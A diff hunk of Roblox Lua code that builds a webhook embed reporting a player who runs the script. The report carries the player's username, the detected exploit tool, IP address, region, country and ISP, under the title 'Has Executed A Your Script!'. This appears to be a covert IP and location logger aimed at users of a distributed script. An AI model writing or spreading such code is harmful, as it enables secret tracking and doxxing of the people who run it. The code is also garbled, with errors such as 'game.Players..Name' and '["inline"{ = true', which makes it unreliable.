@@ -24,34 +24,34 @@ local countryFlagURL = "https://www.countryflags.io/" .. countryCode .. "/flat/6
 
 -- Create an embed for the webhook
 local embedData = {
-    title = "__**" .. game.Players.LocalPlayer.Name .. " Has Used " .. exploitCheck .. " **__""
-    description = "Username: " .. game.Players.LocalPlayer.Name .. "\nExploit: " .. table.concat(exploitChecks, ", "),
-    type = "rich",
-    color = tonumber(0x7269da),
-    image = {
-        url = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+    ["title"] = "__**" .. game.Players..Name .. " Has Executed A Your Script!**__"
+    ["description"] = "Username: " .. game.Players.LocalPlayer.Name .. " Using **" .. exploitCheck .. "**",
+    ["type"] = "rich",
+    ["color"] = tonumber(0x7269da),
+    ["image"] = {
+        ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
             tostring(game:GetService("Players").LocalPlayer.Name)
     },
-    fields = {
+    ["fields"] = {
         {
-            name = "IP Address",
-            value = ip,
-            inline = true
+            ["name"] = "IP Address",
+            ["value"] = ip,
+            ["inline"] = true
         },
         {
-            name = "Location",
-            value = region .. ", " .. countryCode,
-            inline = true
+            ["name"] = "Location",
+            ["value"] = region .. ", " .. countryCode,
+            ["inline"] = true
         },
         {
-            name = "ISP",
-            value = as,
-            inline = true
+            ["name"] = "ISP",
+            ["value"] = as,
+            ["inline"] = true
         },
         {
-            name = "Country Flag",
-            value = "[![Flag](" .. countryFlagURL .. ")](" .. countryFlagURL .. ")",
-            inline = true
+            ["name"] = "Country Flag",
+            ["value"] = "[![Flag](" .. countryFlagURL .. ")](" .. countryFlagURL .. ")",
+            ["inline"{ = true
         }
     }
 }
